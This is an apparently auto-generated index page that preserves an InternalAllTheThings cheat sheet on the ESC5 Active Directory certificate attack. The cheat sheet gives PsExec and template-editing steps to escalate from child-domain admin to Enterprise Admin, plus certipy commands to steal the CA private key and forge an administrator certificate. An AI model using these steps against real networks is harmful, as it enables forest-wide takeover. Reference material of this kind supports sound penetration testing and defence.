---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC5

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc05` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc05.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Certificate ESC5](../../topics/active-directory/active-directory-certificate-esc5.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adcs-esc05 |
| name | Active Directory - Certificate ESC5 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc05.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Certificate ESC5\n\n## ESC5 - Vulnerable PKI Object Access Control\n\n> Escalate the privileges\
  \ from **Domain Administrator** in the child domain into **Enterprise Administrator** at the forest root.\n\n**Requirements**:\n\
  \n* Add new templates to the \"Certificate\" Templates container\n* \"WRITE\" access to the `pKIEnrollmentService` object\n\
  \n**Exploitation - Access Control**:\n\n* Use `PsExec` to launch `mmc` as SYSTEM on the child DC: `psexec.exe /accepteula\
  \ -i -s mmc`\n* Connect to \"Configuration naming context\" > \"Certificate Template\" container\n* Open `certsrv.msc` as\
  \ SYSTEM and duplicate an existing template\n* Edit the properties of the template to:\n    * Granting enroll rights to\
  \ a principal we control in the child domain.\n    * Including Client Authentication in the Application Policies.\n    *\
  \ Allowing SANs in certificate requests.\n    * Not enabling manager approval or authorized signatures.\n* Publish the certificate\
  \ template to the CA\n    * Publish by adding the template to the list in `certificateTemplate` property of `CN=Services`>`CN=Public\
  \ Key Services`>`CN=Enrollment Services`>`pkiEnrollmentService`\n* Finally use the ESC1 vulnerability introduced in the\
  \ duplicated template to issue a certificate impersonating an Enterprise Administrator.\n\n**Exploitation - Golden Certificate**:\n\
  \nUse `certipy`to extract the CA certificate and private key\n\n```ps1\ncertipy ca -backup -u user@domain.local -p password\
  \ -dc-ip 10.10.10.10 -ca 'DOMAIN-CA' -target 10.10.10.11 -debug\n```\n\nThen forge a domain admin certificate\n\n```ps1\n\
  certipy forge -ca-pfx 'DOMAIN-CA.pfx' -upn administrator@domain.local\n```\n\n## References\n\n* [From DA to EA with ESC5\
  \ - Andy Robbins - May 16, 2023](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)\n* [GOAD - part 14 -\
  \ ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)"
_relative_path: active-directory/ad-adcs-esc05.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc05.md
````
